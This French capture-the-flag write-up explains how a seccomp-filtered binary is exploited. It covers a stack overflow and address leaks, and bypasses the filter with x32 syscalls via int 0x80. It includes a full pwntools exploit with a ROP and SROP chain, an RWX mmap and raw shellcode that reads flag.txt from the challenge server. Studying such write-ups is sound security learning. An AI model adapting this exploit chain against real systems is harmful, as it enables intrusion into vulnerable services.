# Prise de connaissance

La première étape de ce challenge, baptisé "Le monde à l'envers", consiste à comprendre le binaire et son fonctionnement général.

Au lancement du programme "Le monde à l'envers", une question nous est posée "Who are you stranger ?". Nous répondons à la question et le programme nous retourne le texte saisi ainsi que d'autres informations ressemblant à une fuite de la mémoire...

Le programme semble boucler indéfiniment à première vue... Nous verrons cela par la suite si c'est vraiment le cas.

# Objectif

L'objectif du challenge est de lire le fichier flag.txt afin d'obtenir ce dernier. Les étapes pour lire un fichier sont les suivantes :
- Obtenir un descripteur de fichier sur flag.txt via le syscall **open**
- Lire le fichier via le syscall **read**
- Fermer le fichier via le syscall **close** (facultatif pour obtenir le flag)

# Analyse du binaire

Nous allons analyser le binaire via Ghidra afin d'en comprendre les rouages internes. Après désassemblage du binaire, deux fonctions sont à relever : "main" et "upside_down_world_enter".

## "main"
```c
void main(void) {
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  prctl(0x26,1,0,0,0); // PR_SET_NO_NEW_PRIVS
  local_78 = 0x20;
  local_76 = 0;
  local_75 = 0;
  local_74 = 0;
  local_70 = 0x35;
  local_6e = 0;
  local_6d = 1;
  local_6c = 0x40000000;
  local_68 = 0x15;
  local_66 = 0;
  local_65 = 7;
  local_64 = 0xffffffff;
  local_60 = 0x15;
  local_5e = 6;
  local_5d = 0;
  local_5c = 9;
  local_58 = 0x15;
  local_56 = 5;
  local_55 = 0;
  local_54 = 5;
  local_50 = 0x15;
  local_4e = 4;
  local_4d = 0;
  local_4c = 0;
  local_48 = 0x15;
  local_46 = 3;
  local_45 = 0;
  local_44 = 1;
  local_40 = 0x15;
  local_3e = 2;
  local_3d = 0;
  local_3c = 0xf;
  local_38 = 0x15;
  local_36 = 1;
  local_35 = 0;
  local_34 = 0x3c;
  local_30 = 0x15;
  local_2e = 0;
  local_2d = 1;
  local_2c = 0xe7;
  local_28 = 6;
  local_26 = 0;
  local_25 = 0;
  local_24 = 0x7fff0000;
  local_20 = 6;
  local_1e = 0;
  local_1d = 0;
  local_1c = 0;
  local_88[0] = 0xc;
  local_80 = &local_78;
  prctl(0x16,2,local_88); // PR_SET_SECCOMP, SECCOMP_MODE_FILTER
  upside_down_world_enter();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

La fonction `main` fait appel à "prctl" :
- Le premier appel permet d'empêcher au processus d'acquérir de nouveaux privilèges.
- Le second appel permet d'activer un filtre seccomp-bpf (Berkeley Packet Filter). Une fois activé, seccomp permet au processus d'exécuter uniquement une liste limitée d'appels système.

## "upside_down_world_enter"

```c
void upside_down_world_enter(void)

{
  char user_input;
  
  // write(stdout, "UPSIDEDOWNWORLD", 15)
  syscall(); // eax=0x1, edi=0x1, rsi=welcome, edx=0xf

  while (user_input[0] != 'B') {

  	// write(stdout, "\nWho are you stranger ? >> ", 27)
    syscall(); // eax=0x1, edi=0x1, rsi=msg, edx=0x1b

    // read(stdout, user_input, 1636)
    syscall(); // eax=0x0, edi=0x0, rsi=user_input, edx=0x664

    // write(stdout, user_input, 100)
    syscall(); // eax=0x1, edi=0x1, rsi=user_input, edx=0x64
  }

}
```

Cette fonction fait :
- Affiche "UPSIDEDOWNWORLD"
- Débute une boucle tant que l'utilisateur n'a pas saisi une chaîne de caractères commençant par "B"
  - Affiche "\nWho are you stranger ? >> "
  - Attend une chaîne de caractères de l'utilisateur d'une taille maximale de 1636 caractères et la stocke dans "user_input"
  - Affiche au maximum 100 caractères de la chaîne de caractères saisie par l'utilisateur (buffer user_input)
  - Reboucle à nouveau si le premier caractère saisi par l'utilisateur ne commence pas par "B"

Nous pouvons donc constater deux choses :
- Nous avons un buffer overflow de 1636 octets (écriture dans user_input)
- Nous avons une fuite du buffer user_input


# Seccomp

## Filtres seccomp

Afin de connaître les filtres seccomp, nous allons utiliser "seccomp-tools" permettant d'examiner les filtres concernant le challenge :

```bash
$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 0001: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0003
 0002: 0x15 0x00 0x07 0xffffffff  if (A != 0xffffffff) goto 0010
 0003: 0x15 0x06 0x00 0x00000009  if (A == mmap) goto 0010
 0004: 0x15 0x05 0x00 0x00000005  if (A == fstat) goto 0010
 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010
 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010
 0007: 0x15 0x02 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010
 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
```

Interprétation :
- Nous pouvons utiliser des appels système supérieurs ou égaux à 0x40000000.
- Les appels systèmes autorisés sont :
 - mmap            : 0x9
 - fstat           : 0x5
 - read            : 0x0
 - write           : 0x1
 - rt_sigreturn    : 0xf
 - exit            : 0x3c
 - exit_group      : 0xe7

Le syscall **open** n'est pas autorisé et est nécessaire pour obtenir un descripteur de fichier sur flag.txt (voir section **Objectif**).

## Bypass de seccomp

## ABI x32

Le fait d'autoriser des appels système supérieurs ou égaux 0x40000000, il serait théoriquement possible d'appeler des syscall x32 en utilisant des registres x64 via l'ABI x32. Pour cela, il suffit d'ajouter au numéro de syscall la valeur 0x40000000. Par exemple, le syscall open de numéro 2, deviendrait 0x40000002.

En revanche, pour utiliser l'ABI x32, le kernel doit être compilé avec l'option "CONFIG_X86_X32". Si ce n'est pas le cas, il n'est donc pas possible d'utiliser l'ABI x32... Et sur le serveur possédant le challenge, l'ABI x32 n'est pas activé.

## Syscall x32

Il est possible d'appeler des syscall x32 depuis un programme x64 via l'interruption 0x80 : **int 0x80**. Les numéros syscall x32 sont légérement différents de ceux en x64. Cela va donc nous permettre d'appeler des syscall différents en x32 et qui sont autorisés par les filtres. Comparons les syscall x32 et x64 autorisés par les filres :

| num  | x32       | x64       |
|------|-----------|-----------|
| 0x0  | read      | read      |
| 0x1  | write     | write     |
| 0x5  | open      | fstat     |
| 0x9  | mmap      | mmap      |
| 0xf  | rt_sigreturn | rt_sigreturn |
| 0x3c | exit      | exit      |
| 0xe7 | exit_group | exit_group |

Nous constatons qu'en utilisant les syscall x32, il est ainsi possible d'appeler le syscall **open** afin d'obtenir notre descripteur de fichier sur flag.txt. **read** étant disponible en x64, pas besoin d'utiliser les syscall x32.


# Etape d'exploitation

## Protections

Nous allons vérifier les protections présentes sur le binaire via la commande **checksec** avec gef :

```bash
gef➤  checksec
[+] checksec for './chall'
Canary                        : ✓ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Full
```

Toutes les protections sont présentes, excepté "Fortify". En revanche, si nous vérifions le code de la fonction `upside_down_world_enter`, aucun canary n'est vérifié dans celle-ci. Il est donc possible d'exploiter le buffer overflow sans chercher à contourner le canary.


## Exploitation

### Leak des adresses

Dans un premier temps, nous allons devoir obligatoirement leak des adresses afin d'obtenir des gadgets et concevoir une ROP chain. Les protections de randomisations sont activées (PIE et ASLR), cette étape étant donc indispensable.

Il est possible de leak 100 octets de la stack (voir section **Analyse du binaire**), cela va nous être très utile. Idéalement, nous devrions leak une adresse de la libc afin d'obtenir davantage de gadgets. En effet, le binaire lui-même n'en contient pas suffisamment (aucune compilation en static du binaire ; ça aurait pu aider).

Si nous déréférençons les adresses présentes sur la stack (les 100 premiers octets), aucune adresse de la libc n'est présente mais seulement l'adresse de retour permettant de revenir dans la fonction `main` (`main+0165`) et l'adresse de la stack :

```bash
gef➤  dereference -l 15 $rsp
0x00007fffffffda38│+0x0000: 0x00005555555552ae  →  <main+0165> nop 	 ← $rsp # <==== main address  
0x00007fffffffda40│+0x0008: 0x000000000060000c ("
                                                 "?)
0x00007fffffffda48│+0x0010: 0x00007fffffffda50  →  0x0000000000000020 (" "?) # <==== stack address
0x00007fffffffda50│+0x0018: 0x0000000000000020 (" "?)
0x00007fffffffda58│+0x0020: 0x4000000001000035 ("5"?)
0x00007fffffffda60│+0x0028: 0xffffffff07000015
0x00007fffffffda68│+0x0030: 0x0000000900060015
0x00007fffffffda70│+0x0038: 0x0000000500050015
0x00007fffffffda78│+0x0040: 0x0000000000040015
0x00007fffffffda80│+0x0048: 0x0000000100030015
0x00007fffffffda88│+0x0050: 0x0000000f00020015
0x00007fffffffda90│+0x0058: 0x0000003c00010015
0x00007fffffffda98│+0x0060: 0x000000e701000015
0x00007fffffffdaa0│+0x0068: 0x7fff000000000006
0x00007fffffffdaa8│+0x0070: 0x0000000000000006
```

En revanche, il est tout à fait possible de faire pivoter la stack et de reboucler sur la fonction afin de leak des adresses plus intéressantes. Pour cela, nous allons devoir récupérer l'adresse de la stack afin de réaliser le pivot.

En regardant un peu plus bas dans la stack, nous pouvons retrouver une adresse appartenant à la fonction `__libc_start_call_main`. Cette fonction de la libc est responsable d'appeler la fonction principale du programme, nommé `main`. Il est donc logique de retrouver une adresse de retour à cette dernière. A environ 18 adresses plus basse, nous retrouvons cette adresse :

```bash
gef➤  dereference -l 15 $rsp+(8*14)
0x00007fffffffdaa8│+0x0000: 0x0000000000000006
0x00007fffffffdab0│+0x0008: 0x00007fffffffdba0  →  0x0000555555555060  →  <_start+0000> endbr64 
0x00007fffffffdab8│+0x0010: 0x484532fbff777000
0x00007fffffffdac0│+0x0018: 0x00007fffffffdb60  →  0x00007fffffffdbc0  →  0x0000000000000000	 ← $rbp
0x00007fffffffdac8│+0x0020: 0x00007ffff7c2a1ca  →  <__libc_start_call_main+007a> mov edi, eax			# <=== __libc_start_call_main address
0x00007fffffffdad0│+0x0028: 0x00007fffffffdb10  →  0x0000555555557d88  →  0x0000555555555100  →  <__do_global_dtors_aux+0000> endbr64 
0x00007fffffffdad8│+0x0030: 0x00007fffffffdbe8  →  0x00007fffffffdf50  →  "/chall"
0x00007fffffffdae0│+0x0038: 0x0000000155554040
0x00007fffffffdae8│+0x0040: 0x0000555555555149  →  <main+0000> push rbp
0x00007fffffffdaf0│+0x0048: 0x00007fffffffdbe8  →  "/chall"
0x00007fffffffdaf8│+0x0050: 0xd963159f0e71e790
0x00007fffffffdb00│+0x0058: 0x0000000000000001
0x00007fffffffdb08│+0x0060: 0x0000000000000000
0x00007fffffffdb10│+0x0068: 0x0000555555557d88  →  0x0000555555555100  →  <__do_global_dtors_aux+0000> endbr64 
0x00007fffffffdb18│+0x0070: 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
```

A ce stade, nous avons donc une adresse du binaire, une adresse de la stack et une adresse de la libc. Il est donc possible de connaître quelle libc est utilisée sur le serveur distant :
- Via https://libc.rip/
- En clonant le projet https://github.com/niklasb/libc-database

En revanche, nous devons obligatoirement posséder l'adresse exacte de la fonction `__libc_start_call_main`. Pour cela, il suffit de décrémenter l'adresse leak puis de vérifier si cette dernière match avec une adresse d'une libc... Avec la libc que j'ai utilisé en local, il suffisait de soustraire 0x7a. La libc utilisé à distance n'est certainement pas la même et l'offset de décalage doit légérement être différent.

Après quelques tests, l'offset de décalage utilisé par la libc distante était 0x80. Via libc-database, nous pouvons retrouver la libc utilisée :

```bash
./get ubuntu debian  # Download Ubuntu's and Debian's libc, old default behavior
./find __libc_start_main 52dc0
ubuntu-glibc (libc6_2.35-0ubuntu3.8_amd64)
```


### Mise en place de l'exploitation

Nous avons accès à tous les gadgets de la libc, nous contrôlons totalement le flux d'exécution du programme, il est maintenant temps de mettre en place notre exploitation. En revanche, l'instruction `int 0x80` est une instruction x32, cela va donc être difficile de trouver un gadget de la sorte...

Le plus simple, sachant qu'on a accès au syscall `mmap`, va être d'allouer un nouvel espace mémoire avec des permissions d'exécution et d'écrire un shellcode qui va faire exactement ce que nous voulons :
- Appeler sys_mmap via sys_rt_sigreturn afin de remplir convenablement les registres nécessaires
- Appeler sys_read et lire dans stdin afin d'écrire le shellcode
- Placer rip au début du shellcode afin de l'exécuter

### Script avec pwntool

```python
from pwn import *
from time import sleep
import requests

IS_LOCAL = False
DEBUG = True
IS_GDB = False

################################################ change this !!!
LIBC_PATH = '/lib/x86_64-linux-gnu/libc.so.6' if IS_LOCAL else './libc6_2.35-0ubuntu3.8_amd64.so'
OFFSET_start_call_main = 0x7a if IS_LOCAL else 0x80
OFFSET_START_CALL_MAIN_START_MAIN = 0xb0 if IS_LOCAL else 0xb0
#################################################

if DEBUG:
	context.log_level = 'debug'

context.arch = 'amd64'

def toHex(data):
	return ''.join([hex(b)[2:].rjust(2, '0') for b in data])

def find_gadget(gadget):
	result = rop_libc.find_gadget(gadget)
	if not result:
		raise Exception(f'Gadget not found: {gadget}')
	return result.address + libc.address


libc = ELF(LIBC_PATH)
rop_libc = ROP(libc)

if IS_LOCAL:
	p = process('chall')
else:
	p = remote('challenges.shutlock.fr', 50010)

# start gdb and break
if IS_GDB:
	gdb.attach(p, '''
		b *upside_down_world_out
		continue
	''')


########################################### STEP 1 : leak stack address and main address
p.recvuntil('Who are you stranger')
p.sendline('A')
p.recv(100)

data = p.recv(100)
addr__main = u64(data[8*9:8*10])
stack = u64(data[8*4:8*5])

ADDR_MAIN = addr__main - 357
RELOOP_ADDR = ADDR_MAIN + 0x1cb
ADDR_STACK = stack + (8*16)
ADDR_STR_PATH_FLAG = ADDR_STACK - 0xCF
ADDR_SHELLCODE = 0x10000

log.info("<main> addr: " + hex(ADDR_MAIN))
log.info("Reloop addr: " + hex(RELOOP_ADDR))
log.info("<stack> addr: " + hex(ADDR_STACK))

########################################### STEP 2 : stack pivoting + leak __libc_start_call_main address
p.sendline(b'B'.ljust(72-8, b"\x00") + p64(stack+(8*14)) + p64(RELOOP_ADDR))
p.sendline(b'A')
p.recv(100)
p.recv(100)

data = p.recv(100)
ADDR_start_call_main = u64(data[8*11:8*12]) - OFFSET_start_call_main
ADDR_start_main = ADDR_start_call_main + OFFSET_START_CALL_MAIN_START_MAIN

log.info("<__libc_start_call_main> addr: " + hex(ADDR_start_call_main))
log.info("<libc__start_main> addr: " + hex(ADDR_start_main))

# Rebase libc
libc.address = ADDR_start_main - libc.symbols['__libc_start_main']
log.info("libc addr: " + hex(libc.address))

# Waiting for the message inviting us to send the payload...
p.recvuntil('Who are you stranger')

# Construct ROPChain
rchain = ROP([])


################################################### Call sys_mmap in use sys_rt_sigreturn
# -----------------> sys_rt_sigreturn
rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(0xf) # syscall id <sys_rt_sigreturn>

rchain.raw(find_gadget(['syscall', 'ret']))

# <sys_mmap> to allocate memory on a 32-bit address (for shellcode)
frame = SigreturnFrame()
frame.rax = 0x9            	# syscall number for sys_mmap
frame.rdi = ADDR_SHELLCODE  # addr
frame.rsi = 500             # len
frame.rdx = 0x7             # prot RWX
frame.r10 = 0x22            # flags MAP_PRIVATE | MAP_ANONYMOUS
frame.r8 = 	0x0            	# fd
frame.r9 = 	0x0            	# off
frame.rsp = ADDR_STACK + 0x108
frame.rbp = ADDR_STACK + 0x400
frame.rip = find_gadget(['syscall', 'ret'])
rchain.raw(bytes(frame))


#################### Call sys_read(stdin, addr_mmap, 200) => Write shellcode
# mov rax, 0
# mov rdx, 200
# mov rdi, stdin
# mov rsi, shellcode_addr
# syscall

# ------------------> rdx = 200
if IS_LOCAL:
	rchain.raw(find_gadget(['pop rbx', 'ret']))
	rchain.raw(200)

	# mov rdx, rbx; pop rbx; pop r12; pop rbp; ret
	rchain.raw(0x000b0123 + libc.address)
	rchain.raw(0x0)
	rchain.raw(0x0)
	rchain.raw(ADDR_STACK) # Conserve rbp with a value belonging to the stack

else:
	rchain.raw(find_gadget(['pop r12', 'ret']))
	rchain.raw(200)

	# mov rdx, r12; pop r12; pop r13; ret
	rchain.raw(0x000a80c8 + libc.address)
	rchain.raw(0)
	rchain.raw(0)
# ------------------>

rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(0) # sys_read

rchain.raw(find_gadget(['pop rdi', 'ret']))
rchain.raw(0) # fd stdin

# rdx=200

rchain.raw(find_gadget(['pop rsi', 'ret'])) # buffer
rchain.raw(ADDR_SHELLCODE)

rchain.raw(find_gadget(['syscall', 'ret']))


#################### DEBUG -----> checks if the shellcode was written correctly
# ; sys_write(stdout, shellcode_addr, 200)
# mov rax, 1
# mov rdi, 1
# mov rsi, shellcode_addr
# syscall

rchain.raw(find_gadget(['pop rax', 'ret']))
rchain.raw(1) # sys_write

rchain.raw(find_gadget(['pop rdi', 'ret']))
rchain.raw(1) # fd stdout

rchain.raw(find_gadget(['pop rsi', 'ret']))
rchain.raw(ADDR_SHELLCODE) # buffer

rchain.raw(find_gadget(['syscall', 'ret']))


#################### place in rsi the start of the shellcode to execute before jumping to it (offset 9 because of the flag path)
rchain.raw(find_gadget(['pop rsi', 'ret']))
rchain.raw(ADDR_SHELLCODE + 9)

# push rsi ; ret
a = 0x0002c446 if IS_LOCAL else 0x00041823
rchain.raw(a + libc.address)

# Loop back through the program to ensure emptying of the stdout buffer
rchain.raw(RELOOP_ADDR)

# ----------------------------------------------------------------------------------
try:
	# Send the ropchain 
	p.sendline(b'B'*(72-8) + p64(stack+(8*14)) + rchain.chain())

	if IS_GDB: # if gdb is open, wait before sending shellcode
		input()

	# send shellcode
	p.sendline(b'flag.txt\x00' + b'\x90'*60 + b'\x48\x31\xC9\x48\x31\xD2\x48\xC7\xC3\x00\x00\x01\x00\x48\xC7\xC0\x05\x00\x00\x00\xCD\x80\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\x00\x00\x01\x00\x48\xC7\xC2\x3C\x00\x00\x00\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\x00\x00\x01\x00\x48\xC7\xC2\x3C\x00\x00\x00\x0F\x05\xc3')
	
except EOFError:
	print("FAILED")

p.interactive()


# ------------------------- Shellcode
# ; fd = sys_open("flag.txt", "r", NULL)
# 0:  48 31 c9                xor    rcx,rcx
# 3:  48 31 d2                xor    rdx,rdx
# 6:  48 c7 c3 00 00 01 00    mov    rbx,0x10000
# d:  48 c7 c0 05 00 00 00    mov    rax,0x5
# 14: cd 80                   int    0x80
#
# ; sys_read(fd, buffer_addr, 60)
# 16: 48 89 c7                mov    rdi,rax
# 19: 48 31 c0                xor    rax,rax
# 1c: 48 c7 c6 00 00 01 00    mov    rsi,0x10000
# 23: 48 c7 c2 3c 00 00 00    mov    rdx,0x3c
# 2a: 0f 05                   syscall
#
# ; sys_write(stdin, buffer_addr, 60)
# 2c: 48 c7 c0 01 00 00 00    mov    rax,0x1
# 33: 48 c7 c7 01 00 00 00    mov    rdi,0x1
# 3a: 48 c7 c6 00 00 01 00    mov    rsi,0x10000
# 41: 48 c7 c2 3c 00 00 00    mov    rdx,0x3c
# 48: 0f 05                   syscall
#
# ; loop back through the program
# 4a: c3                      ret
# -----------------------

# xor rcx,rcx
# xor rdx,rdx
# mov rbx, 0x10000
# mov rax, 5
# int 0x80

# mov rdi, rax
# xor rax, rax
# mov rsi, 0x10000
# mov rdx, 60
# syscall

# mov rax, 1
# mov rdi, 1
# mov rsi, 0x10000
# mov rdx, 60
# syscall

# ret
```

### Points clés

- sys_mmap permet d'allouer de la mémoire avec les permissions que nous souhaitons. De plus, il est possible d'indiquer à quelle adresse allouer la mémoire. Cela a permis d'avoir une adresse sur 4 octets maximum et d'y stocker le chemin d'accès au fichier "flag.txt" qui sera indiqué au syscall read
- sys_rt_sigreturn est très utile dans le pwn car il permet d'indiquer les valeurs de tous les registres depuis la stack et de les charger dans les registres respectifs, y compris rip. Voir https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming
- Depuis un programme x64, il est possible d'appeler des syscall x32 via l'interruption 0x80 (`int 0x80`). Cela nous a permis d'utiliser un numéro de syscall autorisé et d'appeler `sys_open` qui n'était normalement pas autorisé
- Il est possible de retrouver la libc utilisée sur le serveur si nous possédons l'adresse d'un symbole. Pour cela, nous pouvons utiliser https://libc.rip/ ou https://github.com/niklasb/libc-database

# Liens utiles:
- https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/srop-sigreturn-oriented-programming
- https://github.com/niklasb/libc-database
- https://libc.rip/
- https://defuse.ca/online-x86-assembler.htm
- https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing/ret2lib/rop-leaking-libc-address
- https://tripoloski1337.github.io/ctf/2021/07/12/bypassing-seccomp-prctl.html
- https://github.com/david942j/seccomp-tools

